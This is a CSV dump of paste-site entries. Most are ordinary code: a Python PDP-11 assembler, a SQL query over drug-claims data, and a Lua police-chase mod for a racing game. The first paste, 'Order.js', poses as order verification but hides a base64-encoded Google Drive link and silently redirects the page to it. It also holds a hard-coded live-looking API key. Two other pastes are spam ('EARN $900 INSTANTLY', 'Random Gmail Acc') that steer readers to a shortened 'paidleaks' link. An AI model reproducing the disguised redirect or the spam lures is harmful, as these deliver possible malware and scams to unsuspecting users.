id,title,username,language,date,content
uPQSXgv1,Order.js,kammex,JavaScript,Thursday 3rd of April 2025 12:56:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/636/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fRCgGHDL,EARN $900 INSTANTLY 2025 BQ,AleR10M-7C,JavaScript,Thursday 3rd of April 2025 12:56:14 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


thJD2doHvM
"
eZipV2dd,my_code_2,Korotkodul,Python,Thursday 3rd of April 2025 12:48:33 PM CDT,"import pyparsing as pp
import re
import struct
from typing import List, Dict, Union


class PDP11Assembler:
    def __init__(self):
        # Инициализация парсера pyparsing (как в вашем коде)
        self.command_name = pp.Word(pp.alphas)
        self.argument_name = pp.Word(pp.printables, exclude_chars=';,')
        self.arguments = pp.Optional(self.argument_name) + pp.ZeroOrMore(pp.Suppress(',') + self.argument_name)
        self.label = pp.Word(pp.alphas) + pp.Optional(pp.Suppress(' ')) + pp.Suppress("":"")
        self.comment = pp.Suppress(';') + pp.Optional(pp.Suppress(' ')) + pp.restOfLine()
        self.rule = pp.Optional(self.label) + pp.Optional(self.command_name) + pp.Optional(
            self.arguments) + pp.Optional(self.comment)

        # Таблица команд (расширенная версия)
        self.command_table = {
            'halt': {'opcode': 0o000000, 'args': [], 'handler': self._handle_no_args},
            'mov': {'opcode': 0o010000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'add': {'opcode': 0o060000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'sub': {'opcode': 0o160000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'cmp': {'opcode': 0o020000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'br': {'opcode': 0o000400, 'args': ['xx'], 'handler': self._handle_branch},
            'bne': {'opcode': 0o001000, 'args': ['xx'], 'handler': self._handle_branch},
        }

        self.labels = {}
        self.current_address = 0o1000
        self.output_blocks = []

    def parse_line(self, line: str) -> List[str]:
        """"""Аналог вашей функции parse с улучшениями""""""
        line = line.strip()
        if not line:
            return []

        if line.startswith('.'):
            if line.startswith('.='):
                return ['origin', line[2:].strip()]
            return []

        try:
            return self.rule.parseString(line).asList()
        except pp.ParseException:
            return []

    def _handle_no_args(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд без аргументов""""""
        words.append(cmd['opcode'])

    def _handle_branch(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд ветвления""""""
        words.append(cmd['opcode'])
        words.append(args[0])  # Сохраняем метку для разрешения позже

    def _handle_ss_dd(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка двухоперандных команд""""""
        src = self._parse_operand(args[0])
        dst = self._parse_operand(args[1])

        instruction = cmd['opcode'] | (src['mode'] << 6) | (src['reg'] << 3) | dst['mode'] | dst['reg']
        words.append(instruction)

        if src['mode'] == 0o27:  # Немедленная адресация
            words.append(src['value'])

    def _parse_operand(self, op: str) -> Dict[str, Union[int, str]]:
        """"""Улучшенный парсер операндов""""""
        if not op:
            return {'mode': 0, 'reg': 0, 'value': 0}

        # Регистровая адресация (R0-R7)
        if re.match(r'^[rR][0-7]$', op):
            return {'mode': 0, 'reg': int(op[1]), 'value': 0}

        # Немедленная адресация (#n)
        if op.startswith('#'):
            return {'mode': 0o27, 'reg': 0, 'value': int(op[1:])}

        return {'mode': 0, 'reg': 0, 'value': 0}

    def cmd_to_raw_machine_code(self, parsed: List[str]) -> List[Union[int, str]]:
        """"""Аналог вашей функции, но с улучшенной структурой""""""
        if not parsed:
            return []

        if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
            # Обработка метки
            label = parsed[0][0]
            self.labels[label] = self.current_address
            parsed = parsed[1:]

        if not parsed:
            return []

        if parsed[0] == 'origin':
            self.current_address = int(parsed[1], 8)
            return []

        cmd_name = parsed[0].lower()
        if cmd_name not in self.command_table:
            return []

        cmd = self.command_table[cmd_name]
        args = parsed[1:]

        if len(args) != len(cmd['args']):
            return []

        words = []
        cmd['handler'](cmd, args, words)
        return words

    def first_pass(self, lines: List[str]):
        """"""Первый проход: сбор меток""""""
        self.current_address = 0o1000

        for line in lines:
            parsed = self.parse_line(line)
            if not parsed:
                continue

            if parsed[0] == 'origin':
                self.current_address = int(parsed[1], 8)
                continue

            if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
                label = parsed[0][0]
                self.labels[label] = self.current_address
                parsed = parsed[1:]

            if not parsed:
                continue

            cmd_name = parsed[0].lower()
            if cmd_name in self.command_table:
                cmd = self.command_table[cmd_name]
                self.current_address += 2  # Основное слово команды

                # Учет дополнительных слов
                for arg in parsed[1:]:
                    if arg.startswith('#'):
                        self.current_address += 2

    def second_pass(self, lines: List[str]):
        """"""Второй проход: генерация машинного кода""""""
        self.current_address = 0o1000
        current_block = {'start': 0o1000, 'data': []}

        for line in lines:
            parsed = self.parse_line(line)
            if not parsed:
                continue

            if parsed[0] == 'origin':
                if current_block['data']:
                    self.output_blocks.append(current_block)
                addr = int(parsed[1], 8)
                current_block = {'start': addr, 'data': []}
                self.current_address = addr
                continue

            if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
                parsed = parsed[1:]
                if not parsed:
                    continue

            words = self.cmd_to_raw_machine_code(parsed)
            for item in words:
                if isinstance(item, str):  # Метка для ветвления
                    offset = (self.labels[item] - self.current_address - 2) // 2
                    current_block['data'][-1] |= (offset & 0o377)
                else:
                    current_block['data'].append(item)
                    self.current_address += 2

        if current_block['data']:
            self.output_blocks.append(current_block)

    def write_s_record_format(self, filename: str):
        """"""Запись результата в требуемом формате""""""
        if not self.output_blocks:
            return

        block = self.output_blocks[0]
        data_bytes = bytearray()

        for word in block['data']:
            # Правильный порядок байтов (как в вашем примере)
            data_bytes.append(word & 0xFF)
            data_bytes.append((word >> 8) & 0xFF)

        with open(filename, 'w') as f:
            # Первая строка: адрес и размер
            f.write(f""0200 {len(data_bytes):04x}\n"")

            # Байты машинного кода
            for byte in data_bytes:
                f.write(f""{byte:02x}\n"")

    def assemble(self, input_filename: str, output_filename: str):
        """"""Основной метод ассемблирования""""""
        with open(input_filename, 'r') as f:
            lines = f.readlines()

        # Два прохода
        self.first_pass(lines)
        self.second_pass(lines)

        # Запись результата
        self.write_s_record_format(output_filename)


# Пример использования
if __name__ == ""__main__"":
    assembler = PDP11Assembler()

    test_code = """"""
        .=1000
        mov #2, r0
        mov #3, r1
        add r0, r1
        halt
    """"""

    with open(""test.asm"", ""w"") as f:
        f.write(test_code)

    assembler.assemble(""test.asm"", ""output.txt"")
    print(""Ассемблирование завершено. Результат в output.txt"")"
4iEzjYfa,Random Gmail Acc 2N,AleR10M-7C,JavaScript,Thursday 3rd of April 2025 12:40:18 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


DDnqOCBTFd
"
mhZHE3xz,Untitled,apoorv_me,MySQL,Thursday 3rd of April 2025 12:39:54 PM CDT,"WITH max_date_cte AS (
    SELECT MAX(year_month) AS max_date_month FROM {val_fact_weekly}
),

val_data_cte AS (
    SELECT 
        claim_id, patient_sk, plan_sk, product_sk, physician_sk, fill_date, 
        mastered_claim_status_code AS claim_status_code, new_to_product_flag AS val_nbrx, 
        YEAR(fill_date) AS mpd_year, pharmacy_distribution_desc AS channel, 
        source_initial_final_flag AS claim_status, source_flag, source_market, market_code
    FROM {val_fact_weekly}
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}'
        AND UPPER(market_code) LIKE ANY ('ACUTE', 'MIGRAINE', 'PREVENTIVE', 'PSYCH')
        AND UPPER(market_code) NOT LIKE '%CON%'
        AND fill_date >= (
            SELECT DISTINCT ADD_MONTHS(TO_DATE(CONCAT(max_date_month,'01'), 'yyyyMMdd'), -16)
            FROM max_date_cte
        )
),

val_product_cte AS (
    SELECT DISTINCT 
        product_sk, source_product_ndc_code AS ndc11, mdm_product_id AS child_product_id, 
        source_product_name AS product_name, abbvie_product_id
    FROM {val_dim_prd_weekly} 
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}' 
        AND source_product_name IN ('VRAYLAR', 'QULIPTA', 'UBRELVY')
),

val_product_data_cte AS (
    SELECT * FROM val_data_cte
    INNER JOIN val_product_cte USING (product_sk)
    WHERE child_product_id IS NOT NULL
),

val_plan_cte AS (
    SELECT DISTINCT 
        plan_sk, source_plan_id AS primary_plan_id, source_payer_name AS primary_payor_name, 
        abbvie_plan_name, abbvie_plan_id, abbvie_plan_channel, pfv_payer_name, 
        pfv_payer_channel, source_plan_channel, source_plan_name, pfv_plan_id
    FROM {val_dim_plan_weekly}
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}'
),

val_plan_data_cte AS (
    SELECT * FROM val_product_data_cte
    LEFT JOIN val_plan_cte USING (plan_sk)
),

plan_bridge_cte AS (
    SELECT DISTINCT PAYER_PLAN_IDENTIFIER AS payer_plan_id, payer_entity_identifier AS pfv_plan_id 
    FROM pfv_ma360_plan_formulary.pfv_hierarchy_ims_bridge_tbl
),

val_plan_data_final_cte AS (
    SELECT * FROM val_plan_data_cte
    LEFT JOIN plan_bridge_cte USING (pfv_plan_id)
),

acc_map_cte AS (
    SELECT 
        account_id_level1 AS abbvie_plan_id, channel_sk, account_name_level1, 
        account_name_level2, account_name_level3, account_name_level4 
    FROM {acc_map_tbl}
    WHERE account_type_level = 'PLAN'
),

val_acc_map_join_cte AS (
    SELECT * FROM val_plan_data_final_cte
    INNER JOIN acc_map_cte USING (abbvie_plan_id)
),

data_with_mdm_cte AS (
    SELECT DISTINCT child_product_id, product_group_id, market_id, product_group_name 
    FROM {mdm_product_hierarchy_wide_tbl} 
    WHERE market_id IN ('MKT02416165661','MKT33405150037', 'MKT33314581420')
        AND market_name LIKE '%MA_ARC'
        AND product_group_id != market_id
        AND hierarchy_level IN ('PRD', 'PKGSZ')
        AND dds_active_flag = 'Y'
        AND future_current_flag = 'C'
)

SELECT * 
FROM val_acc_map_join_cte
INNER JOIN data_with_mdm_cte USING (child_product_id);
"
c2r3wBcD,dzdzzd,supinus,Lua,Thursday 3rd of April 2025 12:30:05 PM CDT,"ac.log(""Police script"")

local sim = ac.getSim()
local car = ac.getCar(0)
local valideCar = {""audi_rs3_2022_LMC"", ""bmw_m340i_Police_HighSpeed"", ""police_r34_tiresarpi""}
local carID = ac.getCarID(0)

local windowWidth = sim.windowWidth
local windowHeight = sim.windowHeight
local settingsOpen = false
local arrestLogsOpen = false
local camerasOpen = false

local cspVersion = ac.getPatchVersionCode()
local cspMinVersion = 2144
local fontMultiplier = windowHeight/1440

local firstload = true
local cspAboveP218 = cspVersion >= 2363
ac.log(""Police script"")
if not(carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]) or cspVersion < cspMinVersion then return end

local msgArrest = {
    msg = {""`NAME` has been arrested for Speeding. The individual was driving a `CAR`."",
	""We have apprehended `NAME` for Speeding. The suspect was behind the wheel of a `CAR`."",
	""The driver of a `CAR`, identified as `NAME`, has been arrested for Speeding."",
	""`NAME` has been taken into custody for Illegal Racing. The suspect was driving a `CAR`."",
	""We have successfully apprehended `NAME` for Illegal Racing. The individual was operating a `CAR`."",
	""The driver of a `CAR`, identified as `NAME`, has been arrested for Illegal Racing."",
	""`NAME` has been apprehended for Speeding. The suspect was operating a `CAR` at the time of the arrest."",
	""We have successfully detained `NAME` for Illegal Racing. The individual was driving a `CAR`."",
	""`NAME` driving a `CAR` has been arrested for Speeding"",
	""`NAME` driving a `CAR` has been arrested for Illegal Racing.""}
}

local msgLost = {
	msg = {""We've lost sight of the suspect. The vehicle involved is described as a `CAR` driven by `NAME`."",
	""Attention all units, we have lost visual contact with the suspect. The vehicle involved is a `CAR` driven by `NAME`."",
	""We have temporarily lost track of the suspect. The vehicle description is a `CAR` with `NAME` as the driver."",
	""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
	""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",
	""Suspect have been lost, Vehicle Description:`CAR` driven by `NAME`"",
	""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
	""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",}
}

local msgEngage = {
    msg = {""Control! I am engaging on a `CAR` traveling at `SPEED`"",""Pursuit in progress! I am chasing a `CAR` exceeding `SPEED`"",""Control, be advised! Pursuit is active on a `CAR` driving over `SPEED`"",""Attention! Pursuit initiated! Im following a `CAR` going above `SPEED`"",""Pursuit engaged! `CAR` driving at a high rate of speed over `SPEED`"",""Attention all units, we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""Attention units! We have a suspect fleeing in a `CAR` at high speed, pursuing now at `SPEED`"",""Engaging on a high-speed chase! Suspect driving a `CAR` exceeding `SPEED`!"",""Attention all units! we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""High-speed chase underway, suspect driving `CAR` over `SPEED`"",""Control, `CAR` exceeding `SPEED`, pursuit active."",""Engaging on a `CAR` exceeding `SPEED`, pursuit initiated.""}
}

------------------------------------------------------------------------- JSON Utils -------------------------------------------------------------------------

local json = {}

-- Internal functions.

local function kind_of(obj)
  if type(obj) ~= 'table' then return type(obj) end
  local i = 1
  for _ in pairs(obj) do
    if obj[i] ~= nil then i = i + 1 else return 'table' end
  end
  if i == 1 then return 'table' else return 'array' end
end

local function escape_str(s)
  local in_char  = {'\\', '""', '/', '\b', '\f', '\n', '\r', '\t'}
  local out_char = {'\\', '""', '/',  'b',  'f',  'n',  'r',  't'}
  for i, c in ipairs(in_char) do
    s = s:gsub(c, '\\' .. out_char[i])
  end
  return s
end

-- Returns pos, did_find; there are two cases:
-- 1. Delimiter found: pos = pos after leading space + delim; did_find = true.
-- 2. Delimiter not found: pos = pos after leading space;     did_find = false.
-- This throws an error if err_if_missing is true and the delim is not found.
local function skip_delim(str, pos, delim, err_if_missing)
  pos = pos + #str:match('^%s*', pos)
  if str:sub(pos, pos) ~= delim then
    if err_if_missing then
      error('Expected ' .. delim .. ' near position ' .. pos)
    end
    return pos, false
  end
  return pos + 1, true
end

-- Expects the given pos to be the first character after the opening quote.
-- Returns val, pos; the returned pos is after the closing quote character.
local function parse_str_val(str, pos, val)
  val = val or ''
  local early_end_error = 'End of input found while parsing string.'
  if pos > #str then error(early_end_error) end
  local c = str:sub(pos, pos)
  if c == '""'  then return val, pos + 1 end
  if c ~= '\\' then return parse_str_val(str, pos + 1, val .. c) end
  -- We must have a \ character.
  local esc_map = {b = '\b', f = '\f', n = '\n', r = '\r', t = '\t'}
  local nextc = str:sub(pos + 1, pos + 1)
  if not nextc then error(early_end_error) end
  return parse_str_val(str, pos + 2, val .. (esc_map[nextc] or nextc))
end

-- Returns val, pos; the returned pos is after the number's final character.
local function parse_num_val(str, pos)
  local num_str = str:match('^-?%d+%.?%d*[eE]?[+-]?%d*', pos)
  local val = tonumber(num_str)
  if not val then error('Error parsing number at position ' .. pos .. '.') end
  return val, pos + #num_str
end


-- Public values and functions.

function json.stringify(obj, as_key)
  local s = {}  -- We'll build the string as an array of strings to be concatenated.
  local kind = kind_of(obj)  -- This is 'array' if it's an array or type(obj) otherwise.
  if kind == 'array' then
    if as_key then error('Can\'t encode array as key.') end
    s[#s + 1] = '['
    for i, val in ipairs(obj) do
      if i > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(val)
    end
    s[#s + 1] = ']'
  elseif kind == 'table' then
    if as_key then error('Can\'t encode table as key.') end
    s[#s + 1] = '{'
    for k, v in pairs(obj) do
      if #s > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(k, true)
      s[#s + 1] = ':'
      s[#s + 1] = json.stringify(v)
    end
    s[#s + 1] = '}'
  elseif kind == 'string' then
    return '""' .. escape_str(obj) .. '""'
  elseif kind == 'number' then
    if as_key then return '""' .. tostring(obj) .. '""' end
    return tostring(obj)
  elseif kind == 'boolean' then
    return tostring(obj)
  elseif kind == 'nil' then
    return 'null'
  else
    error('Unjsonifiable type: ' .. kind .. '.')
  end
  return table.concat(s)
end

json.null = {}  -- This is a one-off table to represent the null value.

function json.parse(str, pos, end_delim)
  pos = pos or 1
  if pos > #str then error('Reached unexpected end of input.') end
  local pos = pos + #str:match('^%s*', pos)  -- Skip whitespace.
  local first = str:sub(pos, pos)
  if first == '{' then  -- Parse an object.
    local obj, key, delim_found = {}, true, true
    pos = pos + 1
    while true do
      key, pos = json.parse(str, pos, '}')
      if key == nil then return obj, pos end
      if not delim_found then error('Comma missing between object items.') end
      pos = skip_delim(str, pos, ':', true)  -- true -> error if missing.
      obj[key], pos = json.parse(str, pos)
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '[' then  -- Parse an array.
    local arr, val, delim_found = {}, true, true
    pos = pos + 1
    while true do
      val, pos = json.parse(str, pos, ']')
      if val == nil then return arr, pos end
      if not delim_found then error('Comma missing between array items.') end
      arr[#arr + 1] = val
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '""' then  -- Parse a string.
    return parse_str_val(str, pos + 1)
  elseif first == '-' or first:match('%d') then  -- Parse a number.
    return parse_num_val(str, pos)
  elseif first == end_delim then  -- End of an object or array.
    return nil, pos + 1
  else  -- Parse true, false, or null.
    local literals = {['true'] = true, ['false'] = false, ['null'] = json.null}
    for lit_str, lit_val in pairs(literals) do
      local lit_end = pos + #lit_str - 1
      if str:sub(pos, lit_end) == lit_str then return lit_val, lit_end + 1 end
    end
    local pos_info_str = 'position ' .. pos .. ': ' .. str:sub(pos, pos + 10)
    error('Invalid json syntax starting at ' .. pos_info_str)
  end
end

--return json of playerData with only the data needed for the leaderboard
-- data are keys of the playerData table
local function dataStringify(data)
	local str = '{""' .. ac.getUserSteamID() .. '"": '
	local name = ac.getDriverName(0)
	data['Name'] = name
	str = str .. json.stringify(data) .. '}'
	return str
end


------------------------------------------------------------------------- Web Utils -------------------------------------------------------------------------

local settings = {
	essentialSize = 20,
	policeSize = 20,
	hudOffsetX = 0,
	hudOffsetY = 0,
	fontSize = 20,
	current = 1,
	colorHud = rgbm(1,0,0,1),
	timeMsg = 10,
	msgOffsetY = 10,
	msgOffsetX = windowWidth/2,
	fontSizeMSG = 30,
	menuPos = vec2(0, 0),
	unit = ""km/h"",
	unitMult = 1,
	starsSize = 20,
	starsPos = vec2(windowWidth, 0),
}

local settingsJSON = {
	essentialSize = 20,
	policeSize = 20,
	hudOffsetX = 0,
	hudOffsetY = 0,
	fontSize = 20,
	current = 1,
	colorHud = ""1,0,0,1"",
	timeMsg = 10,
	msgOffsetY = 10,
	msgOffsetX = ""1280"",
	fontSizeMSG = 30,
	menuPos = vec2(0, 0),
	unit = ""km/h"",
	unitMult = 1,
	starsSize = 20,
	starsPos = vec2(windowWidth, 0),
}


local function stringToVec2(str)
	if str == nil then return vec2(0, 0) end
	local x = string.match(str, ""([^,]+)"")
	local y = string.match(str, ""[^,]+,(.+)"")
	return vec2(tonumber(x), tonumber(y))
end

local function vec2ToString(vec)
	return tostring(vec.x) .. ',' .. tostring(vec.y)
end

local function stringToRGBM(str)
	local r = string.match(str, ""([^,]+)"")
	local g = string.match(str, ""[^,]+,([^,]+)"")
	local b = string.match(str, ""[^,]+,[^,]+,([^,]+)"")
	local m = string.match(str, ""[^,]+,[^,]+,[^,]+,(.+)"")
	return rgbm(tonumber(r), tonumber(g), tonumber(b), tonumber(m))
end

local function rgbmToString(rgbm)
	return tostring(rgbm.r) .. ',' .. tostring(rgbm.g) .. ',' .. tostring(rgbm.b) .. ',' .. tostring(rgbm.mult)
end

local function parsesettings(table)
	settings.essentialSize = table.essentialSize
	settings.policeSize = table.policeSize
	settings.hudOffsetX = table.hudOffsetX
	settings.hudOffsetY = table.hudOffsetY
	settings.fontSize = table.fontSize
	settings.current = table.current
	settings.colorHud = stringToRGBM(table.colorHud)
	settings.timeMsg = table.timeMsg
	settings.msgOffsetY = table.msgOffsetY
	settings.msgOffsetX = table.msgOffsetX
	settings.fontSizeMSG = table.fontSizeMSG
	settings.menuPos = stringToVec2(table.menuPos)
	settings.unit = table.unit
	settings.unitMult = table.unitMult
	settings.starsSize = table.starsSize or 20
	if table.starsPos == nil then
		settings.starsPos = vec2(windowWidth, 0)
	else
		settings.starsPos = stringToVec2(table.starsPos)
	end
end


ui.setAsynchronousImagesLoading(true)
local imageSize = vec2(0,0)

local hudImg = {
	base = ""https://i.ibb.co/8N4mNj6/zhud.png"",
	arrest = ""https://i.postimg.cc/DwJv2YgM/icon-Arrest.png"",
	cams = ""https://i.postimg.cc/15zRdzNP/iconCams.png"",
	logs = ""https://i.postimg.cc/VNXztr29/iconLogs.png"",
	lost = ""https://i.postimg.cc/DyYf3KqG/iconLost.png"",
	menu = ""https://i.postimg.cc/SxByj71N/iconMenu.png"",
	radar = ""https://i.postimg.cc/4dZsQ4TD/icon-Radar.png"",
}

local cameras = {
	{
		name = ""BOBs SCRAPYARD"",
		pos = vec3(-3564, 31.5, -103),
		dir = -8,
		fov = 60,
	},
	{
		name = ""ARENA"",
		pos = vec3(-2283, 115.5, 3284),
		dir = 128,
		fov = 70,
	},
	{
		name = ""BANK"",
		pos = vec3(-716, 151, 3556.4),
		dir = 12,
		fov = 95,
	},
	{
		name = ""STREET RUNNERS"",
		pos = vec3(-57.3, 103.5, 2935.5),
		dir = 16,
		fov = 67,
	},
	{
		name = ""ROAD CRIMINALS"",
		pos = vec3(-2332, 101.1, 3119.2),
		dir = 121,
		fov = 60,
	},
	{
		name = ""RECKLESS RENEGADES"",
		pos = vec3(-2993.7, -24.4, -601.7),
		dir = -64,
		fov = 60,
	},
	{
		name = ""MOTION MASTERS"",
		pos = vec3(-2120.4, -11.8, -1911.5),
		dir = 102,
		fov = 60,
	},
}

local pursuit = {
	suspect = nil,
	enable = false,
	maxDistance = 250000,
	minDistance = 40000,
	nextMessage = 30,
	level = 1,
	id = -1,
	timerArrest = 0,
	hasArrested = false,
	startedTime = 0,
	timeLostSight = 0,
	lostSight = false,
	engage = false,
}

local arrestations = {}

local textSize = {}

local textPos = {}

local iconPos = {}

local playerData = {}

---------------------------------------------------------------------------------------------- Firebase ----------------------------------------------------------------------------------------------

local urlAppScript = 'https://script.google.com/macros/s/AKfycbwenxjCAbfJA-S90VlV0y7mEH75qt3TuqAmVvlGkx-Y1TX8z5gHtvf5Vb8bOVNOA_9j/exec'
local firebaseUrl = 'https://acp-server-97674-default-rtdb.firebaseio.com/'
local firebaseUrlData = 'https://acp-server-97674-default-rtdb.firebaseio.com/PlayersData/'
local firebaseUrlsettings = 'https://acp-server-97674-default-rtdb.firebaseio.com/Settings'

local function updateSheets()
	local str = '{""category"" : ""Arrestations""}'
	web.post(urlAppScript, str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
		end
	end)
end

local function addPlayerToDataBase()
	local steamID = ac.getUserSteamID()
	local name = ac.getDriverName(0)
	local str = '{""' .. steamID .. '"": {""Name"":""' .. name .. '"",""Getaway"": 0,""Drift"": 0,""Overtake"": 0,""Wins"": 0,""Losses"": 0,""Busted"": 0,""Arrests"": 0,""Theft"": 0}}'
	web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function getFirebase()
	local url = firebaseUrl .. ""Players/"" .. ac.getUserSteamID() .. '.json'
	web.get(url, function(err, response)
		if err then
			print(err)
			return
		else
			if response.body == 'null' then
				addPlayerToDataBase(ac.getUserSteamID())
			else
				local jString = response.body
				playerData = json.parse(jString)
				if playerData.Name ~= ac.getDriverName(0) then
					playerData.Name = ac.getDriverName(0)
				end
			end
			ac.log('Player data loaded')
		end
	end)
end

local function updatefirebase()
	local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(playerData) .. '}'
	web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
		end
	end)
end

local function updatefirebaseData(node, data)
	local str = dataStringify(data)
	web.request('PATCH', firebaseUrlData .. node .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
			updateSheets()
		end
	end)
end

local function addPlayersettingsToDataBase(steamID)
	local str = '{""' .. steamID .. '"": {""essentialSize"":20,""policeSize"":20,""hudOffsetX"":0,""hudOffsetY"":0,""fontSize"":20,""current"":1,""colorHud"":""1,0,0,1"",""timeMsg"":10,""msgOffsetY"":10,""msgOffsetX"":' .. windowWidth/2 .. ',""fontSizeMSG"":30,""menuPos"":""0,0"",""unit"":""km/h"",""unitMult"":1}}'
	web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function loadsettings()
	local url = firebaseUrlsettings .. ""/"" .. ac.getUserSteamID() .. '.json'
	web.get(url, function(err, response)
		if err then
			print(err)
			return
		else
			if response.body == 'null' then
				addPlayersettingsToDataBase(ac.getUserSteamID())
			else
				ac.log(""settings loaded"")
				local jString = response.body
				local table = json.parse(jString)
				parsesettings(table)
			end
		end
	end)
end

local function updatesettings()
	local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(settingsJSON) .. '}'
	web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function onsettingsChange()
	settingsJSON.colorHud = rgbmToString(settings.colorHud)
	settingsJSON.menuPos = vec2ToString(settings.menuPos)
	settingsJSON.essentialSize = settings.essentialSize
	settingsJSON.policeSize = settings.policeSize
	settingsJSON.hudOffsetX = settings.hudOffsetX
	settingsJSON.hudOffsetY = settings.hudOffsetY
	settingsJSON.fontSize = settings.fontSize
	settingsJSON.current = settings.current
	settingsJSON.timeMsg = settings.timeMsg
	settingsJSON.msgOffsetY  = settings.msgOffsetY
	settingsJSON.msgOffsetX  = settings.msgOffsetX
	settingsJSON.fontSizeMSG = settings.fontSizeMSG
	settingsJSON.unit = settings.unit
	settingsJSON.unitMult = settings.unitMult
	settingsJSON.starsSize = settings.starsSize
	settingsJSON.starsPos = vec2ToString(settings.starsPos)
	updatesettings()
end

---------------------------------------------------------------------------------------------- settings ----------------------------------------------------------------------------------------------

local acpPolice = ac.OnlineEvent({
    message = ac.StructItem.string(110),
	messageType = ac.StructItem.int16(),
	yourIndex = ac.StructItem.int16(),
}, function (sender, data)
	if data.yourIndex == car.sessionID and data.messageType == 0 and pursuit.suspect ~= nil and sender == pursuit.suspect then
		pursuit.hasArrested = true
		ac.log(""ZHD Police: Police received"")
	end
end)

local starsUI = {
	starsPos = vec2(windowWidth - (settings.starsSize or 20)/2, settings.starsSize or 20)/2,
	starsSize = vec2(windowWidth - (settings.starsSize or 20)*2, (settings.starsSize or 20)*2),
	startSpace = (settings.starsSize or 20)/4,
}

local function resetStarsUI()
	if settings.starsPos == nil then
		settings.starsPos = vec2(windowWidth, 0)
	end
	if settings.starsSize == nil then
		settings.starsSize = 20
	end
	starsUI.starsPos = vec2(settings.starsPos.x - settings.starsSize/2, settings.starsPos.y + settings.starsSize/2)
	starsUI.starsSize = vec2(settings.starsPos.x - settings.starsSize*2, settings.starsPos.y + settings.starsSize*2)
	starsUI.startSpace = settings.starsSize/1.5
end

local function updatePos()
	imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
	iconPos.arrest1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/3.2)
	iconPos.arrest2 = vec2(imageSize.x/1.215, imageSize.y/5)
	iconPos.lost1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/2.35)
	iconPos.lost2 = vec2(imageSize.x/1.215, imageSize.y/3.2)
	iconPos.logs1 = vec2(imageSize.x/1.215, imageSize.y/1.88)
	iconPos.logs2 = vec2(imageSize.x/1.39, imageSize.y/2.35)
	iconPos.menu1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/1.88)
	iconPos.menu2 = vec2(imageSize.x/1.215, imageSize.y/2.35)
	iconPos.cams1 = vec2(imageSize.x/1.215, imageSize.y/2.35)
	iconPos.cams2 = vec2(imageSize.x/1.39, imageSize.y/3.2)

	textSize.size = vec2(imageSize.x*3/5, settings.fontSize/2)
	textSize.box = vec2(imageSize.x*3/5, settings.fontSize/1.3)
	textSize.window1 = vec2(settings.hudOffsetX+imageSize.x/9.5, settings.hudOffsetY+imageSize.y/5.3)
	textSize.window2 = vec2(imageSize.x*3/5, imageSize.y/2.8)

	textPos.box1 = vec2(0, 0)
	textPos.box2 = vec2(textSize.size.x, textSize.size.y*1.8)
	textPos.addBox = vec2(0, textSize.size.y*1.8)
